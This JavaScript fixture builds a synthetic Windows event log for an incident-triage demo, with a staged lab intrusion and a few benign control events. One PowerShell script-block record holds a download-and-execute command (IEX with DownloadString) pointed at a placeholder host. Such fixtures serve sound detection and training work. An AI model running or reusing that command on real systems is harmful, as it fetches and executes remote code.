(function(root){
  'use strict';
  const events=[],push=(eventId,minute,category,data,host='LAB-WS01')=>{const sources={security:['Microsoft-Windows-Security-Auditing','Security'],sysmon:['Microsoft-Windows-Sysmon','Microsoft-Windows-Sysmon/Operational'],powershell:['Microsoft-Windows-PowerShell','Microsoft-Windows-PowerShell/Operational'],system:['Service Control Manager','System'],defender:['Microsoft-Windows-Windows Defender','Microsoft-Windows-Windows Defender/Operational']};events.push({timestamp:'2026-10-04T08:'+String(minute).padStart(2,'0')+':00Z',eventId,recordId:String(1000+events.length),host,provider:sources[category][0],channel:sources[category][1],data});};
  for(let i=0;i<5;i++)push(4625,i,'security',{TargetUserName:'qa-admin',TargetDomainName:'LAB',IpAddress:'192.0.2.25',LogonType:'10',Status:'0xC000006D'});
  push(4624,5,'security',{TargetUserName:'qa-admin',TargetDomainName:'LAB',IpAddress:'192.0.2.25',LogonType:'10',TargetLogonId:'0x1234'});
  push(1,6,'sysmon',{User:'LAB\\qa-admin',Image:'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',CommandLine:'WINWORD.EXE synthetic-lab.docx',ProcessGuid:'{lab-office}',ParentImage:'C:\\Windows\\explorer.exe'});
  push(1,7,'sysmon',{User:'LAB\\qa-admin',Image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',CommandLine:'powershell.exe -EncodedCommand UwB5AG4AdABoAGUAdABpAGMA',ParentImage:'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',ParentProcessGuid:'{lab-office}',ProcessGuid:'{lab-powershell}'});
  push(4104,8,'powershell',{User:'LAB\\qa-admin',ScriptBlockText:"# Synthetic evidence only; never executed\nIEX (New-Object Net.WebClient).DownloadString('https://payload.example.invalid/lab.ps1')",ScriptBlockId:'lab-script',MessageNumber:'1',MessageTotal:'1'});
  push(3,9,'sysmon',{User:'LAB\\qa-admin',Image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',ProcessGuid:'{lab-powershell}',SourceIp:'192.0.2.40',DestinationIp:'198.51.100.25',DestinationPort:'443',Protocol:'tcp'});
  push(7045,10,'system',{ServiceName:'LabUpdater',ImagePath:'C:\\Users\\qa-admin\\AppData\\Local\\Temp\\lab-update.exe',ServiceType:'user mode service',StartType:'auto start',AccountName:'LocalSystem'});
  push(4698,11,'security',{SubjectUserName:'qa-admin',SubjectDomainName:'LAB',TaskName:'\\LabMaintenance',TaskContent:'<Task><Actions><Exec><Command>C:\\Users\\qa-admin\\AppData\\Local\\Temp\\lab-update.exe</Command></Exec></Actions></Task>'});
  push(1116,12,'defender',{'Threat Name':'Synthetic test detection','Path':'file:_C:\\Users\\qa-admin\\AppData\\Local\\Temp\\lab-update.exe','User':'LAB\\qa-admin'});
  push(1102,13,'security',{SubjectUserName:'qa-admin',SubjectDomainName:'LAB',SubjectLogonId:'0x1234'});
  push(7045,15,'system',{ServiceName:'ApprovedLabAgent',ImagePath:'C:\\Program Files\\LabAgent\\agent.exe'},'LAB-SRV02');
  push(4624,16,'security',{TargetUserName:'backup-service',TargetDomainName:'LAB',IpAddress:'192.0.2.80',LogonType:'3'},'LAB-SRV02');
  root.IncidentTriageDemo={schema:'weownit.incident.events',schemaVersion:1,events};
})(typeof window!=='undefined'?window:globalThis);
